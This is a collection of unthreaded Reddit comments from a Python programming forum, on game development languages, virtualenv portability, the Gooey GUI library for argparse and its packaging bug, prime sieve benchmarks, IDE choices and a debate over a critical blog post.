 1. They both run in real time. If I understood you correctly, python is *not* a compiled language and runs on the fly as it were. 1. Python is pretty good at making games especially if you're planning stuff like cookie clicker or a dark room. pygame seems to be a popular choice from what I hear. However, I'm not sure how good it is at browser games (the frameworks I've seen are more geared towards web site applications than games but i'm sure it's possible). 1. If you want browser games, html5 stuff, javascript, flash, php, ajax etc. all seem to be easier. If you want to run it on the desktop, then python is a good choice. It's quick and easy to start up with. If you want to go more advanced and intensive, c/c++ is definitely a good route, just more complicated and harder to get started with. note: I've also heard good things about lua. no experience with it though.
Lua makes it extremely hard to "organize" your code. With Python you have classes, design patterns, etc, with Lua you just throw all your code in a huge pile and hope for the best.
I love new developments for Python but in the case of automation, I would love something different, a real automation environment with ST as a programming language. There is [Beremiz](http://www.beremiz.org/) for example. Why? Because in most cases a programmer wants to have control of more than one process at the same time. For example having control over many rooms in a building. An environment for automation doesn't need loops, because it runs cyclic. All is controlled by state machines. Python isn't made for this. 
Back here in Delft (Iron)Python (notebooks) are the science standard in the science field, NumPy, ScyPy etc
Really, that's it? People pay for that?
Neither Javascript nor Python operate in anything remotely like the formal definition of [real time](http://en.wikipedia.org/wiki/Real-time_computing). Also, real time computing is quite unnecessary for game programming. So yeah, "what".
The big difference is JavaScript runs in a browser (or app) so is a lot easier to distribute. You could just upload your game and send URL's to people and they wouldn't have to install anything.
If you feel like it, you can load micropython onto a board like the [stm32f4 discovery](http://uk.farnell.com/stmicroelectronics/stm32f4discovery/stm32f407-usb-otg-discovery-kit/dp/2009276). Has a few more pins and is pretty cheap. 
For when there just isn't enough data in the world.
Typically, you don't actually move a virtualenv around, instead you'd run `pip freeze &gt; requirements.txt` which would then allow someone else to install everything you have installed. There are a few reasons why this is the ideal soliton. First, the Python interpreter isn't in the venv, it's only symlinked to the interpreter that was used when the venv was created. Second, many packages use the state of your machine during installations, so they may not work on other machines unless they are actually installed there. An easier solution would be to host your application somewhere, like Heroku (a small single dyno app is free) and then pointing whoever you want to see it to the URL that Heroku (or whatever other service) gives you. 
Yeah I have a Mac, and I would purchase it again (full blown Unix without all of the constant fucking-with-the-computer you have to do with Linux, and I bought it used), but even *I* wouldn't spend money on that shit.
Some time ago i played with this, not sure if it solves your problem: https://github.com/strycore/fakegir And maybe you have to use the tricks from Wing IDE: https://wingware.com/doc/howtos/pygobject
/r/learnpython
You have a Java library to integrate with, but you prefer the succinctness of Python.
How exactly do you think Jython crashed your browser?
Try using http://www.regexr.com/ Find it really helpful, and I used the old version of the site to learn regex a few years back
This is pretty cool, thanks for putting it together!
Thanks :) will try this at work. Just building a utility that needs just a simple gui around it. Hope it works with pyinstaller/cx_freeze
I would recommend packaging your app (and all its dependencies) into a nice standalone .exe file (and a binary for Linux) so that whomever you are handing the CD to would be able to run it without having to install python, virtualenv etc. Luckily there are various tools that can do that easily for python, such as http://www.py2exe.org/ and http://www.pyinstaller.org/.
There should be a way the use standard dialogs like file chooser and color chooser where this kind of data is needed. A way to visually group options would be useful, too. 
Not sure if this was in your initial instructions, but given the 403, you might need set permissions in one (possibly two) places: 1. Go to https://console.developers.google.com and make sure that you've enabled the correct API &amp; given it permissions. 2. If you're using a Google Apps for Business account, you'll need to go into the Security settings &amp; explicitly allow your account to use an API.
Sublime Text is what I use.
I hope that you will someday also add an option to save the outputted GUI code as pure Python, so we can use this as boilerplate, since the generated output will only be sufficient for the most basic of programs. Love the idea though &lt;3 Edit: can't install it python setup.py install running install running build running build_py error: package directory 'gooey/app' does not exist I'm on Ubuntu 14.04
You can use virtualenv --relocatable to make your venv relocatable. According to the documentation there are still a few issues with it, though: http://virtualenv.readthedocs.org/en/latest/virtualenv.html#making-environments-relocatable
I'm using the [Pycharm](http://www.jetbrains.com/pycharm/) community edition.
Dynamic theme in blogspot requires Javascript to load, you can use normal/tradition theme thouh
Oh, yeah.. Bugger. I never did that side of things. If you look in `setup.py` it's the copy/pasted "TowelStuff" code from the PyPi example. Edit: Alright, I think I've sorted it out..? It's a little embarrassing, but I've never really messed with the dist utils before. So I'm not sure if I'm doing it right. 
Thank you, I like this.
You are right, I reran the timings. timeit for n=10,000,000 P2 Garion 664579 primes: 3.697 secs ( 0.06162 min) Timer: 3.87049522065 P4 Rhomboid 664579 primes: 0.920 secs ( 0.01533 min) Timer: 0.921490579565 P6 Recipe 664579 primes: 2.168 secs ( 0.03613 min) Timer: 2.40444869054 timeit for n=100,000,000 P2 Garion: Memory P4 Rhomboid: 5761455 primes: 8.159 secs ( 0.13598 min) Timer: 8.02659776506 P6 Recipe: 5761455 primes: 11.092 secs ( 0.18487 min) Timer: 15.3737989546 I do not trust timeit.Timer, notice that it is larger than the elapsed time, which makes no sense.
cool !
The ´type` parameter could be a good place to add information about what kind of widget to use. You could use it for other information , too. For example something like parser.add_argument("filename", help="Name of the file", type=gooey.Type( dialog=Dialogs.FileChooser, group='flags', converter=str)) 
Shame it's only argparse, though; I started using docopt for everything a while back.
I guess only partially. This is where it fails for me: &gt;&gt;&gt; from ctypes import cast Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; ImportError: cannot import name cast 
Don't assume anything about the filesystem. You don't know the path separator is a slash. Use "os.path.join()" if you must. Smarter is to let GPG use the defaults it was compiled with, unless you have a specific GNUPGHOME to use. The str() at the end is a huge red flag to me, too. Take in unicode, too. def sign(unicode_message, output_encoding="UTF-8"): assert isinstance(unicode_message, unicode) if "GNUPGHOME" in os.environ: gpg = gnupg.GPG(gnupghome=os.environ["GNUPGHOME"]) else: gpg = gnupg.GPG() gpg.encoding = output_encoding gpg.secret_keyring=['secring.gpg'] # weird that these are here gpg.public_keyring=['pubring.gpg'] return gpg.sign(unicode_message.encode(gpg.encoding)) 
Clever. Can it handle interactive programs that use input()?
The parser is currently pretty well isolated in the code. A new one could be swapped in without too much trouble if enough people want Docopt support (I'd never heard of it until now). 
&gt; but Lua could be a better choice for making games. Why?
Cool idea but it's not python 3 compatible (the print statement), although that shouldn't be too hard to change :D 
Yeah :( I'd have loved to do it in 3 (`yield from` is like my favorite thing in any language ever), but WxPython, as far as I know, isn't 3 compatible yet. 
If you were to do docopt, you might as well do it for every CLI app. Docopt turns standard-style `--help` messages into argument parsers. Which means you can extend your project to go `--help` → docopt → gooey.
The talk was specifically referencing POSIX. Did something change throughout the time? ^(edit: s/specially/specifically/)
Very cool, though I wish it used Qt instead.
Nope, I was wrong when I said you were right. Without a heavy processor load, I get: erat 664579 primes: 6.326 secs ( 0.10543 min) Timer: 6.38547271062 garion 664579 primes: 2.725 secs ( 0.04542 min) Timer: 2.0559609771 rhomboid 664579 primes: 1.181 secs ( 0.01968 min) Timer: 1.29117464438 recipe 664579 primes: 0.160 secs ( 0.00267 min) Timer: 0.144444021306 sundaram3 664579 primes: 0.260 secs ( 0.00433 min) Timer: 0.23088220441 danielG 664579 primes: 0.310 secs ( 0.00517 min) Timer: 0.242432109783 hanks2 664579 primes: 0.390 secs ( 0.00650 min) Timer: 0.374191038044 I also found another fast algorithm; spent too much time on this already, see: http://stackoverflow.com/questions/2068372/fastest-way-to-list-all-primes-below-n-in-python 
What about parsing kwargs in the decorator, e.g. @Gooey(arg_filename="dialog:FileChooser, some-other-option:Foo") Your python then would be something like: def Gooey(..., **kwargs): for k, v in kwargs.items(): if k[:4] == 'arg_': # process the option here using # v.split(','), then split those by ':', etc. *Edit:* Or even cleaner: @Gooey(arg_filename=ArgOptions(dialog="FileChooser", some_other_option="Foo")) Then create an ArgOptions container class: class ArgOptions: def __init__(self, **kwargs): self.options = kwargs 
Very cool. I wish I had thought of it
aha awesome :p have you include the man too? 
It looks like an extremely cool project. I had created a simple command-line program two weeks ago where Gooey would be a perfect fit (almost, except for File dialogs). I imported the library and tried to run the program, but it raises an `IOError` for me: PS D:\&gt; python .\my_module.py Traceback (most recent call last): File ".\my_module.py", line 60, in &lt;module&gt; from gooey import Gooey File "C:\Python27\lib\site-packages\gooey\__init__.py", line 1, in &lt;module&gt; from gooey_decorator import Gooey File "C:\Python27\lib\site-packages\gooey\gooey_decorator.py", line 16, in &lt;module&gt; from gooey.gui.base_window import BaseWindow File "C:\Python27\lib\site-packages\gooey\gui\base_window.py", line 16, in &lt;module&gt; import header File "C:\Python27\lib\site-packages\gooey\gui\header.py", line 10, in &lt;module&gt; from gooey import i18n File "C:\Python27\lib\site-packages\gooey\i18n.py", line 37, in &lt;module&gt; _DICTIONARY = load(get_path(_LANG)) File "C:\Python27\lib\site-packages\gooey\i18n.py", line 24, in get_path raise IOError('Could not find {} language file'.format(language)) IOError: Could not find english language file I am not using any internationalization stuff in my project. It's only in English. Any ideas?
Doh! This is probably due to me packaging it wrong. It's my first time using distutils. I'll try to figure out what's going wrong. Give me a sec. Edit: Alright, yeah, looks like I left out the `data_files` param in `setup.py` (I think). So, it's missing both the language files *and* the entire images directory... I'm patching this now. Thanks for bringing it to my attention! In the meantime, you can copy the contents of `/languages` and the entire `/images` directory from the repo into the `site-packages/gooey` directory. That'll solve it. Sorry! 
For browser-based games, HTML5 and unity are also viable options. Although unity is probably overpowered for something like a cookie clicker clone, it's likely the easier startup for web game development than the other options because of all the resources and documention available. 
&gt; there doesn't seem to be anything here
Very cool, hoping that a MacOSX version comes out!
Pretty cool. . . I'd like the opposite though, I prefer working from the command line! :)
Interfacing with Apache Solr methods for direct statistical analysis without relying on Solr Cloud XML structured data.
wingide
there are about 6.5 million of those Finnish people.
Your utility looks like the ultimate solution for quick, easy GUIs; docopt is the ultimate solution for quick, easy command line programs. Your solution takes argparse parameters and crafts a GUI; docopt takes help text and generates all the arguments and options. One gets the exciting feeling they would form the ultimate combination if they worked together. :-)
Scripting for wsa ... Websphere admin. Being able to fetch soap services with suds ... Or being able to fetch/insert data from/into oracle db, or file system, running unitests ... Before uploading and configuring an ear on websphere. It's perfect for the job.
Next thing we need is an automagical program generator. Then, we can let the program run and create infinitely many arbitrary programs! Yay science...
http://wiki.wxpython.org/ProjectPhoenix work in progress
In practice, not all `--help` output will be exactly in line with Docopt. For instance, an application with a lot of options may format its help as two columns. In extreme cases (e.g. `git`, `hg`), the `--help` may not even talk about individual options at all (instead directing you to `--help-foo` subpages).
Now only if we could do the opposite!
The newest post on Python for Investigative Journalists: this article covers error handling (try-catch and try-catch-finally) and generators. These subjects are explained in easy language and an example with [WikiMapia](http://www.wikimapia.org). In the example, I demonstrate how to search and find all mosques in and near Aleppo, Syria. Not only will this return the geographical location, but also a set of pictures from some of these locations. In the next post, I'll continue on this subject and extend this example with the Panoramio data API to retrieve more photos. In the end, these photos will be put together in a database for geolocating photos and videos. The example uses the [PyMapia](http://pypi.python.org/pypi/pymapia) library, which I wrote about a month ago. It's documentation is available [here](http://pymapia.readthedocs.org).
I think you should be looking at something like docker(https://www.docker.com, if the idea is to get it running on a different machine with minimal effort). 
Nowadays I pretty much develop 90% of my code in IPython notebooks, and once the code works well enough that it's worth saving I'll just copy it over to a ``*.py`` file and do some final edits using a simple text editor (geany in my case).
Reason why I'm looking into it was that it seemed to be the best static/dynamic pairing (jruby would be equivalent though). Importing java classes into jython works the way it **should** work. I had so many problems getting other pairings to work.
Hey Armin, I suspect your rational thoughts may light a fire or two under a few people who are going to want to prove you wrong. We know the train is going to crash at some point and this adding of static types may have been all that was required to make it happen sooner rather than later. It's too bad you pointed out these issues.
same here. its enough for my purposes, pydev etc. are far too heavy imo. but i wasnt working on any huge projects for a long time, though
Id love to see it wrap docopt !!
Python is getting close... [DEAP genetic programming framework](http://deap.gel.ulaval.ca/doc/default/examples/index.html)
This work on Mac?
What do you see when you run ``` python --version ``` At the commandline?
virtualenv says Python 3.4.1 But 2.7.7 is also available, but I just can't seem to force it to work.
It's Python, it'll run anywhere
Python 3 doesn't have `urllib2`.
UDFs in apache pig
Calling `random.seed(0)` will assure that the random numbers are always the same. Random numbers are not actually random, but pseudo random and basically just come from a really long list of numbers. If you don't seed it, it will usually use the system clock to seed it (since the time is sort of "random" when measured down to the millisecond. I'd suggest building your images with different seeds so that you get a variety but also have reproducible results. 
what do you mean by "aligned to the cardinal axes" 
Hi Armin; I know you're here ;) It's clearly time for you to move on. It is quite difficult to leave projects and things that you plugged a lot of your life into, and its a struggle to let go. But each and every blog post you spiral further downwards into whining about Python and decisions made by a team of people smarter than you. Nobody is twisting your arm to stay in this community. Everyone who has, and still does, use Python tools you created will always be forever grateful for the contributions you made, but clearly that is past tense and you desperately want to be elsewhere. So go. Fly. Be brilliant in some other community, don't let Python hold you back from all you can accomplish. 
Okay. So I updated the code changing random.seed(0) to random.seed() and it still gives the same identical results as before. I pushed the code update as well.
Check the sidebar on the right; there's a lot of good stuff under Online books, Online exercises and programming challenges. Think of a problem you have, or someone around you has, and solve it. Even if you don't actually complete it (I remember my first attempt was a POS system for my (then) workplace - I think I had a screen with menus and options that did nothing); you will learn a lot by breaking down a real world problem into parts and solving them. Also, check out /r/learnpython 
Basically all of the features ("hills") go north/south or east/west or 45-degrees diagonal. Perlin Noise: http://edwardtoy.files.wordpress.com/2014/01/perlin_18_04_08.png Perlin's Simplex Noise: http://www.g-truc.net/post/0437-1.jpg
I am not the author, just a user... The library is not mine.
Don't call seed! ;)
I very much agree with you. He has made some great contributions, but these posts are getting lame. Python is great for what it is. With Python 3.4 and the promise that PyPy holds, I have absolutely zero complaints about it. If I need strict typing and very high runtime speed at the expense of productivity and debugability, I'll use something like Go. But for the vast majority of what I need, I'm glad I have Python 3.4.
If I do not call seed even once the results are identical. I do not think the random module is affecting the noise module. 
Are you saying design patterns don't exist in Lua? Thats probably why you've been downvoted, just because a language doesn't have classes does not mean it cant be organized.
Nice. Another alternative way is that, at my workplace, many command line apps are configured as Jenkins jobs. Jenkins allows defining UI elements to capture parameters from end users and pass them down to command line apps.
The interpreter as the subconsciousness of the Python language and its symptoms. Unlike some others, I really enoy this series of articles and I believe the author is a good critic, not a poor soul who whines on the internet because he has no friends. Still I wonder how hard it is to fix the mentioned issues if they begin to hit the average Python user. By those I don't mean developers who attempt to emulate CPythons behavior like the PyPy crew who have to compromise their design by implementing quirks to stay compatible but those who use `mypy` or `pytypes` together with an IDE or developers whose project guidelines mandate the use of type annotations. I expect those things to come and python-dev to respond on a case-by-case base. Let's call it user pressure and pragmatic responses. Right now there is little more than buzz and things haven't even gone into the PEP stage. So things will be weird and also somewhat funny, as always. 
Would *greatly* love a Python 3 port, *even* if it uses TKinter! :)
Wouldn't it be both easier and quicker to just read the man pages?
help messages are often generated by computers, eg. by argparse. Those messages should adhere to standards.
Nobody would really use this project with git/hg and other advanced software, special apps not even touching the command line is what would be used in this case.
&gt; But each and every blog post Umm, the unicode post was perfect, and the last two have been very reasonable.... I think you might be reading too much into this....
Uncalled for ad hominem, without even trying to address the article at all. Go on, tell us how you really feel.
I'll try it!
You can done in Java what can be done in Jython or in C what can be done with Python :) I scripted a machine vision camera using its .NET API library using IronPython (and having no knowledge of .NET/C#).
My current project is 53 KL of handwritten code, 122 KLOC with DB migrations.
Nicer and more modern engine than pygame. Check our www.love2d.org
It would help enormously if you linked to the `noise` module that you are using. It is not a standard one that everyone would recognize by name alone. [Is it this one?](https://github.com/caseman/noise)
Very nice! 
[Python can run in your browser!](http://www.skulpt.org/) But it's probably not even suitable for browser games.
I'm back on argparse, and glad to see this is using it. Arparse is in the standard library and has a number of important advantages over docopt.
I was thinking about a similar thing but one that would parse the program's `--help` output or a manpage (thus not limiting stuff to python). Unfortunately it felt like every --help is different and the parser would be insane. Any plans to tackle that? ;)
&gt; The thing is, Javescript runs in real time. Please explain what you mean? Javascript doesn't even come CLOSE to running in real time - so I suspect you're confusing us. What do you want Py to do exactly? Also: &gt;Is it even possible, or it purely a linear sequence only suited for programs I totally don't understand this. 
Brandon refers to "that guy" who gave a talk about design patterns in Python. It was Alex Martelli, and [here's part one](https://www.youtube.com/watch?v=1Sbzmz1Nxvo).
I didn't say it can't be done, I just said it's easier in other languages.
Would only work for tools written in Python though, isn't it? Are there many of those? Edit: Sorry, somehow missed the "write Python wrappers" part, that's an interesting idea. 
I've tend to move between PyDev and [Komodo Edit](http://komodoide.com/). When one of them annoys me, I move to the other for a few months.
The last project I worked on had something like 300k lines of "actual code", with another few hundred k of libraries. That included mostly obviated by the most recent rewrite though, which split it out into an API and an angular front-end. The API has far less code than the whole project, and the angular project that serves as its UI is very trim. Excluding jQuery and Angular, it's probably fewer than 5KLOC. 
The biggest question is: do you have any prior programming experience? "If I want to learn how to sprint really well, what kind of shoe do I need?" 